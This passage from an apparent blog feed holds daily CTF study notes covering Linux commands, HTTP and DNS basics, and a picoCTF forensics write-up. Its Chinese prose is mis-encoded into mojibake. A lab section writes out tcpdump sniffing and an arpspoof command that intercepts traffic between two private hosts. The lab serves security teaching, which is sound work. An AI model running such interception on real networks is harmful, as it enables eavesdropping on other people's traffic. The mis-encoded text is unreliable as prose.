å°±æ˜¯æŠŠ <code>ls</code> çš„çµæœå¯«åˆ°<code>xxx.txt</code></li><li><code>ls &gt;&gt; xxx.txt</code> å°±æ˜¯æŠŠ <code>ls</code> çš„çµæœappend åˆ° <code>xxx.txt</code></li><li><code>cat &lt; xxx.txt</code> å°±æ˜¯æŠŠ <code>xxx.txt</code> çš„å…§å®¹å‚³çµ¦<code>cat</code></li><li><code>2&gt;</code> æ˜¯æŠŠéŒ¯èª¤è¨Šæ¯å¯«åˆ°æª”æ¡ˆ</li></ul></li><li>regex<ul><li>å¯ä»¥åœ¨ <a href="https://regexlearn.com/">regexlearn</a> å­¸</li><li>åœ¨ <a href="https://regex101.com/">regex101</a> æ¸¬è©¦</li><li><code>.</code>: ä»»æ„å­—å…ƒ</li><li><code>*</code>: 0 åˆ°ç„¡é™å¤šæ¬¡</li><li><code>+</code>: 1 åˆ°ç„¡é™å¤šæ¬¡</li><li><code>[abc]</code>: a, b, c ä»»ä¸€å€‹</li><li><code>[^abc]</code>: é™¤äº† a, b, c ä¹‹å¤–</li><li><code>[a-z]</code>: a åˆ° z ä¹‹é–“</li></ul></li><li><code>sed</code>: stream editor æœ‰é»è¤‡é›œï¼Œæœƒç”¨åˆ°çš„æ™‚å€™å†æŸ¥å°±å¥½</li><li><code>grep</code>: global regular expression print<ul><li><code>-i</code>: ä¸åˆ†å¤§å°å¯«</li><li><code>-v</code>: åå‘é¸å–</li><li><code>-n</code>: é¡¯ç¤ºè¡Œæ•¸</li><li><code>-r</code>: éè¿´</li><li><code>-l</code>: åªé¡¯ç¤ºæª”å</li><li><code>-c</code>: åªé¡¯ç¤ºæ•¸é‡</li><li><code>-e</code>: å¤šå€‹æ¢ä»¶</li><li><code>-E</code>: æ­£è¦è¡¨é”å¼</li><li><code>-A</code>: é¡¯ç¤ºå¾Œé¢å¹¾è¡Œ</li><li><code>-B</code>: é¡¯ç¤ºå‰é¢å¹¾è¡Œ</li><li><code>-C</code>: é¡¯ç¤ºå‰å¾Œå¹¾è¡Œ</li><li><code>grep xxx *</code>: åœ¨æ‰€æœ‰æª”æ¡ˆä¸­æ‰¾ <code>xxx</code></li></ul></li><li><code>find</code>: æ‰¾æª”æ¡ˆ</li><li>bash script<ul><li>å°±æ˜¯ç”¨ <code>.sh</code> çµå°¾çš„æª”æ¡ˆï¼Œç„¶å¾Œè£¡é¢å¯«ä¸€äº›æŒ‡ä»¤</li><li>ç„¶å¾Œåœ¨æª”æ¡ˆè£¡é¢å¯«ä¸€äº›æŒ‡ä»¤ï¼Œ<code>chmod</code>åŠ åŸ·è¡Œæ¬Šé™å°±å¯ä»¥åŸ·è¡Œäº†</li></ul></li><li><code>crontab</code>: å®šæ™‚åŸ·è¡Œ<ul><li><code>crontab -e</code>: ç·¨è¼¯</li><li><code>crontab -l</code>: åˆ—å‡º</li><li><code>crontab -r</code>: åˆªé™¤</li><li><code>* * * * * xxx</code>: åˆ†é˜ å°æ™‚ æ—¥ æœˆ æ˜ŸæœŸå¹¾ æŒ‡ä»¤</li></ul></li><li>apt / mirror: å®‰è£å¥—ä»¶<ul><li><code>apt update</code>: æ›´æ–°å¥—ä»¶</li><li><code>apt upgrade</code>: å‡ç´šå¥—ä»¶ (é †åºæœƒæ˜¯å…ˆæ›´æ–°å†å‡ç´š)</li><li><code>apt install xxx</code>: å®‰è£å¥—ä»¶</li><li><code>apt remove xxx</code>: ç§»é™¤å¥—ä»¶</li><li><code>apt search xxx</code>: æœå°‹å¥—ä»¶</li><li><code>apt list</code>: åˆ—å‡ºæ‰€æœ‰å¥—ä»¶</li><li><code>apt show xxx</code>: é¡¯ç¤ºå¥—ä»¶è³‡è¨Š</li><li><code>apt autoremove</code>: ç§»é™¤ä¸éœ€è¦çš„å¥—ä»¶</li><li><code>apt clean</code>: æ¸…é™¤å¿«å–</li><li><code>apt autoclean</code>: æ¸…é™¤èˆŠçš„å¿«å–</li></ul></li><li><code>$()</code>: æœƒå„ªå…ˆåŸ·è¡Œ <code>()</code>æŒ‡ä»¤çš„æ¨™æº–è¼¸å‡ºï¼Œç•¶æˆå‰é¢çš„æŒ‡ä»¤çš„åƒæ•¸<ul><li>ä¾‹å¦‚ <code>echo $(ls)</code> å°±æ˜¯æŠŠ <code>ls</code> çš„çµæœå‚³çµ¦<code>echo</code></li></ul></li><li><code>cut</code>: åˆ‡å‰²<ul><li><code>-d</code>: åˆ†éš”ç¬¦è™Ÿ</li><li><code>-f</code>: ç¬¬å¹¾å€‹</li><li><code>cut -d " " -f 1 xxx</code>: ä»¥ç©ºæ ¼åˆ‡å‰²ï¼Œå–ç¬¬ä¸€å€‹</li></ul></li></ul><h2 id="åƒè€ƒè³‡æ–™">åƒè€ƒè³‡æ–™ <a href="#åƒè€ƒè³‡æ–™" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ‰‹æŠŠæ‰‹ Python æ•™å­¸â€” å¾å…¥é–€åˆ°å…¥ä¾µ</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB1</a></li><li><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘ä¸æ˜¯ web3.0 çš„web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘LinuxåŸºç¤æŒ‡ä»¤èˆ‡ä½¿ç”¨è€…ç®¡ç†</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ·ºè«‡ç¶²è·¯èˆ‡H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€ &lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;æœ¬æ—¥é€²åº¦ï¼š&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;&lt;a href=&quot;https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z&quot;&gt;ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Linux
åŸºç¤æŒ‡ä»¤èˆ‡ä½¿ç”¨è€…ç®¡ç†&lt;/a&gt;&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="ä¸€ç›´åˆ· CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="è³‡å®‰" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 éµäººè³½ ä¸€ç›´åˆ· CTF - Day25</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day25/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day25/</id>
    <published>2024-09-27T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€ <a href="#å‰è¨€" class="headerlink"></a></h2><p>æœ¬æ—¥é€²åº¦ï¼š</p><ul class="task-list"><li><label><input type="checkbox" checked=""><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ·ºè«‡ç¶²è·¯èˆ‡H T T P - å®Œ</a></label></li><li><label><input type="checkbox" checked=""> 2 é¡ŒForensics</label></li></ul><span id="more"></span><h2 id="writeup">Writeup <a href="#writeup" class="headerlink"></a></h2><h3 id="ç¬¬ä¸€é¡Œverify">ç¬¬ä¸€é¡Œï¼šVerify <a href="#ç¬¬ä¸€é¡Œverify" class="headerlink"></a></h3><p>æŠŠæ¯ä¸€å€‹æª”æ¡ˆéƒ½æ‹¿å» decrypt ä¸€æ¬¡ï¼Œç„¶å¾Œçœ‹æœ‰æ²’æœ‰æ­£ç¢ºçš„ hash å¯ä»¥å¾—åˆ°flagã€‚</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./files -type f -exec ./decrypt.sh {} \; 2&gt;/dev/null | grep "picoCTF"</span><br></pre></td></tr></tbody></table></figure><h3 id="ç¬¬äºŒé¡Œscan-surprise">ç¬¬äºŒé¡Œï¼šScan Surprise <a href="#ç¬¬äºŒé¡Œscan-surprise" class="headerlink"></a></h3><p>ssh é€£é€²å»ä¹‹å¾Œæœƒæœ‰å€‹è·³å‡ºä¸€å€‹ QR codeï¼Œæƒå‡ºä¾†å°±æ˜¯ flag äº†</p><h2 id="ä¸Šèª²è¨˜éŒ„">ä¸Šèª²è¨˜éŒ„ <a href="#ä¸Šèª²è¨˜éŒ„" class="headerlink"></a></h2><p><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ·ºè«‡ç¶²è·¯èˆ‡H T T P</a></p><h3 id="ä»€éº¼æ˜¯å”å®š">ä»€éº¼æ˜¯å”å®š <a href="#ä»€éº¼æ˜¯å”å®š" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/RSNrYo5.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="http">HTTP <a href="#http" class="headerlink"></a></h4><blockquote><p>HTTP/2 ä¹‹å‰çš„ç‰ˆæœ¬æ˜¯ä¸€ç¨®å»ºç«‹åœ¨ TCP ä¸Šçš„å‚³è¼¸å”å®šã€‚(HTTP/3ä¾‹å¤–ï¼Œä»Šå¤©ä¸æ)<br>ç‚ºä½•éœ€è¦ä½¿ç”¨ TCP æ˜¯å› ç‚ºç¶²é ä»–æœƒéœ€è¦å¯é æ€§çš„å‚³è¼¸ã€‚</p></blockquote><figure><img data-src="https://i.imgur.com/ofobafe.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h5 id="request">Request <a href="#request" class="headerlink"></a></h5><figure><img data-src="https://i.imgur.com/sPrrISD.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>è·¯å¾‘å°±æ˜¯æƒ³è¦æª”æ¡ˆçš„ä½ç½®</p><h5 id="response">Response <a href="#response" class="headerlink"></a></h5><figure><img data-src="https://i.imgur.com/VRbe3Ws.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>status code:2 é–‹é ­æˆåŠŸï¼Œ3 é–‹é ­é‡æ–°å°å‘ï¼Œ4 é–‹é ­å®¢æˆ¶ç«¯éŒ¯èª¤ï¼Œ5 é–‹é ­ä¼ºæœå™¨éŒ¯èª¤</p><h5 id="http-lab">HTTP Lab <a href="#http-lab" class="headerlink"></a></h5><figure><img data-src="https://i.imgur.com/i7lPkRs.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/P1HGD39.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p><a href="https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Methods">HTTPMethod</a></p><h4 id="dns">DNS <a href="#dns" class="headerlink"></a></h4><blockquote><p>å…¨åå«åš Domain Name Systemï¼Œæ˜¯ä¸€ç¨®å»ºç«‹åœ¨ UDP çš„å”å®šã€‚<br>ä¸»è¦ç”¨ä¾†æŸ¥è©¢ Domain Name çš„ IP Address æˆ–æ˜¯æŸ¥è©¢ IP Address å°æ‡‰çš„ DomainNameã€‚<br>é‚£ä»€éº¼æ˜¯ Domain Name å‘¢ï¼Ÿ</p></blockquote><figure><img data-src="https://i.imgur.com/P1axnwy.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/63XpbUD.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h5 id="dns-lab">DNS Lab <a href="#dns-lab" class="headerlink"></a></h5><figure><img data-src="https://i.imgur.com/ezlp25H.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/25rSqEN.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h2 id="åƒè€ƒè³‡æ–™">åƒè€ƒè³‡æ–™ <a href="#åƒè€ƒè³‡æ–™" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ‰‹æŠŠæ‰‹ Python æ•™å­¸â€” å¾å…¥é–€åˆ°å…¥ä¾µ</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB1</a></li><li><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘ä¸æ˜¯ web3.0 çš„web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘LinuxåŸºç¤æŒ‡ä»¤èˆ‡ä½¿ç”¨è€…ç®¡ç†</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ·ºè«‡ç¶²è·¯èˆ‡H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€ &lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;æœ¬æ—¥é€²åº¦ï¼š&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;&lt;a href=&quot;https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z&quot;&gt;ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ·ºè«‡ç¶²è·¯èˆ‡
H T T P - å®Œ&lt;/a&gt;&lt;/label&gt;&lt;/li&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt; 2 é¡Œ
Forensics&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="ä¸€ç›´åˆ· CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="è³‡å®‰" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 éµäººè³½ ä¸€ç›´åˆ· CTF - Day24</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day24/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day24/</id>
    <published>2024-09-26T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€ <a href="#å‰è¨€" class="headerlink"></a></h2><p>æœ¬æ—¥é€²åº¦ï¼š</p><ul class="task-list"><li><label><input type="checkbox" checked=""><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ·ºè«‡ç¶²è·¯èˆ‡H T T P - åˆ° NAT</a></label></li></ul><span id="more"></span><h2 id="æ·ºè«‡ç¶²è·¯èˆ‡-h-t-t-p">æ·ºè«‡ç¶²è·¯èˆ‡ H T T P <a href="#æ·ºè«‡ç¶²è·¯èˆ‡-h-t-t-p" class="headerlink"></a></h2><h3 id="ä»€éº¼æ˜¯ç¶²è·¯">ä»€éº¼æ˜¯ç¶²è·¯ï¼Ÿ <a href="#ä»€éº¼æ˜¯ç¶²è·¯" class="headerlink"></a></h3><p>ç°¡å–®ä¾†èªªå°±æ˜¯æŠŠå¾ˆå¤šå°é›»è…¦ç”¨ç¶²è·¯ç·šæˆ–æ˜¯ WIFIä¸²é€£åœ¨ä¸€èµ·å°±æ˜¯æ‰€è¬‚çš„ç¶²è·¯äº†</p><p>å¯ä»¥æ¯”å–»ç‚ºä¸€å€‹é€ä¿¡çš„éç¨‹</p><ol type="1"><li>æ’°å¯«ä¿¡ä»¶å…§å®¹</li><li>æ”¾é€²ä¿¡å°æ±ºå®šè¦æ›è™Ÿé‚„æ˜¯å¹³ä¿¡ï¼Œé‚„æœ‰å¯„çµ¦èª°</li><li>å­£è¦‹åº•æ­¢å’Œæ”¶ä»¶åœ°å€</li><li>æŠŠä¿¡çµ¦éƒµå±€ï¼Œç„¶å¾Œè½‰ç™¼åˆ°å…¶ä»–éƒµå±€å†é€åˆ°æ”¶ä»¶äººæ‰‹ä¸Šï¼ˆå¦‚æœä½ è¦é€çš„äººå°±åœ¨ä½ å®¶éš”å£ï¼Œä½ å°±ç›´æ¥çµ¦ä»–å°±å¥½äº†ï¼‰</li></ol><p>ç¶²è·¯ä¹Ÿæ˜¯ä¸€æ¨£çš„æ¦‚å¿µï¼Œå‡è¨­è¦å»ç€è¦½ Google é€™å€‹ç¶²ç«™</p><ol type="1"><li>Application layer (ä¿¡ä»¶å…§å®¹)<br><img data-src="https://i.imgur.com/TyrNoiL.png" alt="Image"></li><li>Transport layer (ä¿¡å°)<br><img data-src="https://i.imgur.com/Mh6F6Ru.png" alt="Image"></li><li>Network layer (å¯„ä»¶äººå’Œæ”¶ä»¶äºº)<br><img data-src="https://i.imgur.com/ctf7Io9.png" alt="Image"><br><img data-src="https://i.imgur.com/BJAtXDq.png" alt="Image"></li><li>Link layer (éƒµå±€)<br><img data-src="https://i.imgur.com/WjtMKGY.png" alt="Image"></li></ol><h3 id="ä»€éº¼äº‹-mac-address">ä»€éº¼äº‹ Mac Address <a href="#ä»€éº¼äº‹-mac-address" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/guXiiJc.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>è·Ÿ IP çš„å·®ç•°æ˜¯ IP æ˜¯å¯ä»¥è®Šå‹•çš„ï¼Œ Mac Addressæ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥åœ¨å€åŸŸç¶²è·¯è£¡é¢æ˜¯æª¢æŸ¥ Mac Address çš„ï¼Œè€Œä¸æ˜¯ IP Address</p><p>åœ¨å¤ä»£æ²’æœ‰ Switch çš„æ™‚å€™ï¼Œ é©ç”¨ Hub ä¾†é€£æ¥å¤šå°é›»è…¦ï¼Œä½†æ˜¯ Hubæ˜¯æ²’æœ‰è…¦è¢‹çš„ï¼Œä»–æœƒæŠŠä¿¡é€çµ¦æ‰€æœ‰äººï¼Œæ¯å°é›»è…¦æœƒæª¢æŸ¥ Mac Addressçœ‹é‚£å°ä¿¡æ˜¯ä¸æ˜¯å¯„çµ¦è‡ªå·±çš„ï¼Œå¦‚æœæ˜¯å°±æ¥æ”¶ï¼Œå¦‚æœä¸æ˜¯å°±ä¸Ÿæ‰</p><figure><img data-src="https://i.imgur.com/r575Pbz.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>åœ¨æœ‰ Switch å¾Œå°±åªæœƒæŠŠä¿¡é€çµ¦å°çš„äºº</p><figure><img data-src="https://i.imgur.com/TZKfGgs.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>ä½†åœ¨æˆ‘å€‘ç€è¦½ç¶²é æ˜¯ç”¨ IP Address ä¾†æ‰¾åˆ°å°æ–¹çš„ï¼Œè¦æ‰¾åˆ°å°æ–¹çš„ MacAddress å°±è¦ç”¨ ARP å”å®š</p><p><img data-src="https://i.imgur.com/NIA1F6B.png" alt="Image"><br><img data-src="https://i.imgur.com/R8bhGIW.png" alt="Image"></p><p>æœƒæœ‰ä¸€å€‹ ARP Table ä¾†è¨˜éŒ„å°æ–¹çš„ MacAddressï¼Œå›ºå®šä¸€æ®µæ™‚é–“å¾Œæœƒæ¸…ç†å’Œæ›´æ–°</p><p>æœƒä¸æœƒæœ‰è³‡å®‰å•é¡Œï¼Ÿ<br>æœƒçš„ï¼Œå¦‚æœåœ¨æˆ‘å•ç›®æ¨™çš„ Mac Address æ™‚ï¼Œæœ‰å£äººé¨™æˆ‘èªªä»–æ˜¯ç›®æ¨™çš„ MacAddressï¼Œé€™æ¨£å°±æœƒæŠŠä¿¡é€çµ¦å£äººï¼Œé€™å°±æ˜¯ ARP Spoofing</p><figure><img data-src="https://i.imgur.com/3uRI4Kk.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="lab---arp-spoofing">Lab - ARP Spoofing <a href="#lab---arp-spoofing" class="headerlink"></a></h3><p>Lab é—œæ‰äº†ä¸èƒ½ç© ğŸ˜¥</p><figure><img data-src="https://i.imgur.com/2dhPc7O.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -Ai eth1</span><br></pre></td></tr></tbody></table></figure><p>tcpdump å»è½å°åŒ…çš„å…§å®¹ï¼Œ <code>-A</code> æ˜¯æŠŠå°åŒ…çš„å…§å®¹é¡¯ç¤ºå‡ºä¾†ï¼Œ<code>-i</code> æ˜¯æŒ‡å®šç¶²å¡</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo arpspoof -i eth1 -t 192.168.111.1 192.168.111.2</span><br></pre></td></tr></tbody></table></figure><p>é€™å€‹æŒ‡ä»¤å°±æœƒå¹«ä½ å¯¦ä½œ ARP Spoofing æŠŠ <code>192.168.111.1</code>è¦å‚³çµ¦ <code>192.168.111.2</code> çš„å°åŒ…æ””æˆª</p><figure><img data-src="https://i.imgur.com/zWABU43.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="ä»€éº¼æ˜¯ç¶²è·¯---ç¶²æ®µ">ä»€éº¼æ˜¯ç¶²è·¯ - ç¶²æ®µ <a href="#ä»€éº¼æ˜¯ç¶²è·¯---ç¶²æ®µ" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/9Qut1Lg.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>ä¸Šä¸‹æœ€ä¸åŒçš„æ˜¯ï¼Œä¸Šé¢çš„é€çš„äººæ˜¯å€åŸŸç¶²è·¯ï¼Œä¸‹é¢çš„æ˜¯é€çµ¦å€åŸŸå¤–çš„äººï¼Œæ‰€ä»¥ä»–æ˜¯è¦ç¶“éRouter ä¾†è½‰ç™¼çš„</p><p>ä¸€æ¨£ç”¨å¯„ä¿¡ä¾†æ¯”å–»</p><figure><img data-src="https://i.imgur.com/yFWXbH2.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/ckCjpOt.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>ä¸Šä¸‹æœ€å¤§çš„å·®ç•°å°±æ˜¯åœ¨å€åŸŸå…§é‚„æ˜¯å€åŸŸå¤–ï¼Œåœ¨ç¶²è·¯å…§ä¹Ÿæ˜¯ä¸€æ¨£çš„ï¼Œè¦æ€æ²’çœ‹æ˜¯åœ¨å€åŸŸå…§å¤–ç­‰ç­‰æœƒè¬›</p><figure><img data-src="https://i.imgur.com/2u1JCbv.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/xWRmV85.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>å¯ä»¥é€šéåˆ¤æ–·ç›®æ¨™ IP æ˜¯å¦æ˜¯å¯„çµ¦ Default Gatewayä¾†åˆ¤æ–·æ˜¯å€åŸŸå…§é‚„æ˜¯å€åŸŸå¤–</p><figure><img data-src="https://i.imgur.com/JfzeMAX.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>å¦‚ä½•çŸ¥é“ä¾†æº IP å’Œç›®æ¨™ IP æ˜¯ä¸æ˜¯åœ¨åŒä¸€å€‹ç¶²æ®µï¼Ÿ</p><figure><img data-src="https://i.imgur.com/QC3dXek.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>æŠŠ Address å’Œ Netmask çš„äºŒé€²åˆ¶åš AND é‹ç®—ï¼Œå°±æœƒæ˜¯ Network IDï¼Œä¿—æœå…©å€‹ Network ID ä¸€æ¨£å°±æ˜¯åœ¨åŒä¸€å€‹ç¶²æ®µ (æ‰€ä»¥å¦‚æœ netmask æ˜¯<code>255.255.255.0</code> çš„è©±å…¶å¯¦å°±çœ‹ IPå‰ä¹ç¢¼æ˜¯ä¸æ˜¯éƒ½ä¸€æ¨£å°±çŸ¥é“æ˜¯ä¸æ˜¯åœ¨åŒå€åŸŸï¼Œå¦‚æœ netmask æ˜¯<code>255.255.0.0</code> å°±çœ‹ IP å‰å…­ç¢¼)</p><p><code>/24</code> çš„æ„æ€ <code>255.255.255.0</code> è½‰æˆäºŒé€²åˆ¶æ˜¯<code>11111111.11111111.11111111.00000000</code> ï¼Œå› ç‚ºæœ‰ 24 å€‹1ï¼Œå°±è¡¨ç¤ºæˆ <code>/24</code></p><h3 id="ä»€éº¼æ˜¯ç¶²è·¯---è·¯ç”±">ä»€éº¼æ˜¯ç¶²è·¯ - è·¯ç”± <a href="#ä»€éº¼æ˜¯ç¶²è·¯---è·¯ç”±" class="headerlink"></a></h3><p>è³‡æ–™é€åˆ° router æ™‚ï¼Œ router æœƒæ ¹æ“šä¸Šé¢çš„è·¯ç”±è¡¨å‚³é€ packetï¼Œè·¯ç”±æœƒæ ¹æ“šä»–çš„è·¯ç”±åœ°åœ–ä¾†æ±ºå®šè¦å‚³é€çµ¦èª°ï¼ˆå°±åƒæˆ‘å€‘å¯ä»¥åˆ©ç”¨ mtrçœ‹åˆ°æˆ‘å€‘è³‡æ–™æ˜¯æ€éº¼å‚³é€ç›®æ¨™çš„)</p><figure><img data-src="https://i.imgur.com/ARzYFfG.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>ä¸Šé¢é€™å€‹å°±æ˜¯è·¯ç”±è¡¨ï¼Œå¦‚æœæ˜¯ 192.168.20.5 å°±æœƒé€šé 192.168.20.2å‡ºå»</p><figure><img data-src="https://i.imgur.com/hg8FCbD.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>router table æœƒä»¥ netmask æœ€é•·çš„ç‚ºå„ªå…ˆ</p><p>default gateway å°±æ˜¯ 